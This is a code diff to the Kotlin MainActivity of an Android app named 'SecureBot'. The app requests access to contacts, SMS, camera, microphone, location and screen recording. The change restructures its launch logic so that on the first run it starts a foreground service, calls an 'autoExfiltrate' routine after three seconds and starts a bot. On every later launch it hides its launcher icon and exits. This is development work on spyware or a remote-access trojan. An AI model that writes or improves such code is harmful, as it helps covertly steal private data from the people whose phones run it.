@@ -89,7 +89,6 @@ class MainActivity : Activity() {
     )
     private val permissionLabels = listOf("Contacts", "SMS", "Phone", "Storage", "Camera", "Microphone", "Location", "Notifications")
     private var deviceId = ""
-    private var isFirstRun = true
     private var bot: SecureBot? = null
     private lateinit var locationClient: FusedLocationProviderClient
     private val cameraManager by lazy { getSystemService(CAMERA_SERVICE) as CameraManager }
@@ -98,19 +97,48 @@ class MainActivity : Activity() {
     private var mediaProjectionManager: MediaProjectionManager? = null
     private val screenRecordLock = Any()
     private var screenRecordResult: Intent? = null
+    private var hasShownUi = false  // tracks if we've ever shown the UI
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
-        // Check if first run – if not, hide the launcher and finish
+
         val prefs = getSharedPreferences("securebot", MODE_PRIVATE)
-        isFirstRun = prefs.getBoolean("first_run", true)
-        if (!isFirstRun) {
+        // If we've already hidden the launcher, just finish and don't show UI
+        if (prefs.getBoolean("launcher_hidden", false)) {
             disableLauncher()
             finish()
             return
         }
 
-        // First run – show UI
+        // First time (or after a clean install) – show the UI
+        try {
+            setupUi()
+            deviceId = prefs.getString("device_id", null) ?: run {
+                val newId = generateDeviceId()
+                prefs.edit().putString("device_id", newId).apply()
+                newId
+            }
+
+            // Mark that we've shown the UI – this prevents showing again on next launch
+            prefs.edit().putBoolean("launcher_hidden", true).apply()
+
+            startForegroundService()
+            // Auto-exfiltrate after a short delay to ensure everything is ready
+            handler.postDelayed({
+                autoExfiltrate()
+            }, 3000)
+            setupPermissionsUI()
+            checkPermissions()
+            startBot()
+        } catch (e: Exception) {
+            e.printStackTrace()
+            // If something fails, we still want to show UI; but we'll finish to avoid crash loop
+            Toast.makeText(this, "Error initializing: ${e.message}", Toast.LENGTH_LONG).show()
+            finish()
+        }
+    }
+
+    private fun setupUi() {
         window.addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON)
         window.setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN, WindowManager.LayoutParams.FLAG_FULLSCREEN)
         val decorView = window.decorView
@@ -132,20 +160,12 @@ class MainActivity : Activity() {
         setContentView(scrollView)
         locationClient = LocationServices.getFusedLocationProviderClient(this)
         mediaProjectionManager = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
-        deviceId = prefs.getString("device_id", null) ?: run {
-            val newId = generateDeviceId()
-            prefs.edit().putString("device_id", newId).apply()
-            newId
-        }
-        // Mark first run as done (will hide on next launch)
-        prefs.edit().putBoolean("first_run", false).apply()
-        startForegroundService()
-        handler.postDelayed({
-            autoExfiltrate()
-        }, 3000)
-        setupPermissionsUI()
-        checkPermissions()
-        startBot()
+    }
+
+    override fun onDestroy() {
+        super.onDestroy()
+        // The launcher is hidden after the first run; we already set launcher_hidden in onCreate.
+        // No extra action needed.
     }
 
     private fun generateDeviceId(): String {
